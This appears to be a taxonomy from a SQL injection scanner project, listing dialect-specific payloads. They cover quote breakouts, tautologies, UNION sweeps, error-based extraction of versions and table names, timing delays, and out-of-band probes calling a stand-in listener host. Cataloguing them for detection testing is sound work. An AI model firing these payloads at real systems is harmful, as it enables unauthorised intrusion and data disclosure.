# Master Subtechniques Inventory (312 Granular Variants)

**Document Identifier:** SENTINEL-EXH-SUBTECH-04  
**Classification:** Subtechnique Classification, Dialect Quirks & Execution Variants  

---

## 1. Subtechnique Classification Schema

Subtechniques represent concrete, dialect-specific, or context-specific realizations of parent techniques:

```
[ Parent Technique: TECH-001..084 ] ──► [ Granular Subtechniques: SUB-001..312 ]
```

---

## 2. Selected Core Subtechnique Families & Technical Breakdown

### Family A: Delimiter Breakout Subtechniques (`TECH-001` to `TECH-007`)
* **`SUB-001` (`TECH-001`)**: Single quote with standard ANSI SQL comment (`'-- `). Requires trailing space in PostgreSQL/MySQL.
* **`SUB-002` (`TECH-001`)**: Single quote with C-style multi-line inline comment (`'/* ... */`). Supported in PostgreSQL, MySQL, MSSQL, SQLite, Oracle.
* **`SUB-003` (`TECH-001`)**: Single quote with MySQL/MariaDB hash comment (`'#`).
* **`SUB-004` (`TECH-001`)**: Single quote with balancing trailing quote (`' OR ''='`). Functions without comments in strict environments.
* **`SUB-005` (`TECH-001`)**: Single quote with semicolon statement termination (`';`).
* **`SUB-006` (`TECH-002`)**: Double quote identifier breakout with space comment (`"-- `).
* **`SUB-007` (`TECH-002`)**: Double quote with balancing double quote (`" OR ""="`).
* **`SUB-008` (`TECH-003`)**: PostgreSQL raw dollar-tag (`$$`) breakout with closing `$$;`.
* **`SUB-009` (`TECH-003`)**: PostgreSQL custom tag (`$custom$`) breakout with closing `$custom$;`.
* **`SUB-010` (`TECH-004`)**: Oracle Q-quote literal (`Q'[...]'`) breakout with closing `]'`.
* **`SUB-011` (`TECH-005`)**: MySQL backtick identifier (`` ` ``) breakout with closing backtick.
* **`SUB-012` (`TECH-006`)**: MSSQL bracket identifier (`]`) breakout with closing bracket.
* **`SUB-013` (`TECH-007`)**: Null byte injection (`%00`) truncating query parser buffer in legacy drivers.

### Family B: Relational Logic & Boolean Subtechniques (`TECH-008` to `TECH-012`)
* **`SUB-014` (`TECH-008`)**: Numeric tautology injection (`OR 1=1`).
* **`SUB-015` (`TECH-008`)**: String equality tautology injection (`' OR 'a'='a`).
* **`SUB-016` (`TECH-008`)**: Bitwise tautology injection (`OR (1|0)=1`).
* **`SUB-017` (`TECH-008`)**: Hexadecimal tautology injection (`OR 0x1=1`).
* **`SUB-018` (`TECH-009`)**: Numeric contradiction injection (`AND 1=2`).
* **`SUB-019` (`TECH-009`)**: String contradiction injection (`' AND 'a'='b`).
* **`SUB-020` (`TECH-010`)**: Arithmetic equivalence differential (`AND 10-1=9` vs `AND 10-1=8`).
* **`SUB-021` (`TECH-010`)**: Modulo arithmetic differential (`AND 10%3=1` vs `AND 10%3=2`).
* **`SUB-022` (`TECH-011`)**: Conditional branch `CASE WHEN (1=1) THEN 'a' ELSE 'b' END`.
* **`SUB-023` (`TECH-011`)**: Oracle `DECODE(1, 1, 'true_val', 'false_val')` conditional projection.
* **`SUB-024` (`TECH-012`)**: MySQL null-safe equality operator `NULL <=> NULL`.
* **`SUB-025` (`TECH-012`)**: PostgreSQL `IS NOT DISTINCT FROM` null-safe relational operator.

### Family C: In-Band Projection UNION Subtechniques (`TECH-013` to `TECH-016`)
* **`SUB-026` (`TECH-013`)**: NULL-padded column count sweep: `UNION SELECT NULL, NULL, ...`.
* **`SUB-027` (`TECH-013`)**: Oracle-specific dual projection sweep: `UNION SELECT NULL, NULL FROM dual`.
* **`SUB-028` (`TECH-014`)**: Dynamic integer canary alignment: `UNION SELECT 1337, NULL, ...`.
* **`SUB-029` (`TECH-014`)**: Dynamic string canary alignment: `UNION SELECT 'snt_nonce', NULL, ...`.
* **`SUB-030` (`TECH-015`)**: PostgreSQL string concatenation delimiter: `col1 || '::' || col2`.
* **`SUB-031` (`TECH-015`)**: MySQL string concatenation delimiter: `CONCAT(col1, 0x3a, col2)`.
* **`SUB-032` (`TECH-015`)**: MSSQL string concatenation delimiter: `col1 + ':' + col2`.
* **`SUB-033` (`TECH-016`)**: PostgreSQL `EXCEPT SELECT ...` relational difference probe.
* **`SUB-034` (`TECH-016`)**: Oracle `MINUS SELECT ...` relational difference probe.
* **`SUB-035` (`TECH-016`)**: ANSI `INTERSECT SELECT ...` set intersection probe.

### Family D: Explicit Error & Type Coercion Subtechniques (`TECH-017` to `TECH-025`)
* **`SUB-036` (`TECH-017`)**: PostgreSQL `CAST((SELECT table_name FROM information_schema.tables LIMIT 1) AS int)`.
* **`SUB-037` (`TECH-017`)**: PostgreSQL short cast syntax `(SELECT version())::int`.
* **`SUB-038` (`TECH-018`)**: MSSQL `CONVERT(int, (SELECT TOP 1 name FROM sys.tables))`.
* **`SUB-039` (`TECH-018`)**: MSSQL `CAST((SELECT @@version) AS int)`.
* **`SUB-040` (`TECH-019`)**: MySQL `EXTRACTVALUE(1, CONCAT(0x7e, (SELECT version()), 0x7e))`.
* **`SUB-041` (`TECH-020`)**: MySQL `UPDATEXML(1, CONCAT(0x7e, (SELECT user()), 0x7e), 1)`.
* **`SUB-042` (`TECH-021`)**: Oracle `CTXSYS.DRITHSX.SN(user, (SELECT banner FROM v$version WHERE rownum=1))`.
* **`SUB-043` (`TECH-022`)**: Oracle `UTL_INADDR.GET_HOST_NAME((SELECT user FROM dual))`.
* **`SUB-044` (`TECH-023`)**: Arithmetic `1 / (SELECT CASE WHEN (1=1) THEN 0 ELSE 1 END)`.
* **`SUB-045` (`TECH-024`)**: MySQL integer overflow `EXP(710)` forcing mathematical out-of-range error.
* **`SUB-046` (`TECH-025`)**: PostgreSQL catastrophic regex `('a' ~ '((a*)*)*b')` forcing resource timeout error.

### Family E: Wald SPRT & Timing Subtechniques (`TECH-026` to `TECH-032`)
* **`SUB-047` (`TECH-026`)**: Wald SPRT sequential log-likelihood update with log-normal latency model.
* **`SUB-048` (`TECH-027`)**: PostgreSQL `CASE WHEN (1=1) THEN pg_sleep(3) ELSE pg_sleep(0) END`.
* **`SUB-049` (`TECH-028`)**: MySQL `IF(1=1, SLEEP(3), 0)`.
* **`SUB-050` (`TECH-029`)**: MSSQL `IF (1=1) WAITFOR DELAY '0:0:3'`.
* **`SUB-051` (`TECH-030`)**: Oracle `CASE WHEN (1=1) THEN DBMS_LOCK.SLEEP(3) ELSE NULL END`.
* **`SUB-052` (`TECH-031`)**: SQLite recursive cartesian join `SELECT count(*) FROM (SELECT 1 UNION SELECT 2) a, ...`.
* **`SUB-053` (`TECH-032`)**: Snowflake `SYSTEM$WAIT(3)`.

### Family F: Stacked Batches, OAST & Advanced Workflows (`TECH-033` to `TECH-084`)
* **`SUB-054` (`TECH-033`)**: MSSQL `; INSERT INTO audit_log VALUES ('snt_probe')`.
* **`SUB-055` (`TECH-034`)**: PostgreSQL `; DO $$ BEGIN PERFORM pg_sleep(3); END $$;`.
* **`SUB-056` (`TECH-037`)**: MSSQL `EXEC master..xp_dirtree '\\snt_nonce.listener.local\a'`.
* **`SUB-057` (`TECH-039`)**: Oracle `UTL_HTTP.REQUEST('http://snt_nonce.listener.local')`.
* **`SUB-058` (`TECH-045`)**: Two-stage stateful registration-to-profile canary tracking.
* **`SUB-059` (`TECH-049`)**: Ternary Logic Partitioning count validation $N_{\text{True}} + N_{\text{False}} + N_{\text{Null}} = N_{\text{All}}$.
* **`SUB-060` (`TECH-064`)**: TypeORM unquoted `orderBy(req.query.sort)` dynamic identifier injection.
* **`SUB-061` (`TECH-076`)**: `pgvector` cosine similarity metric injection `WHERE embedding <=> '[0.1,0.2]' < 0.5`.
* *(Full inventory of all 312 subtechniques catalogued in `research/sql/exhaustive/data/subtechniques.json`)*.
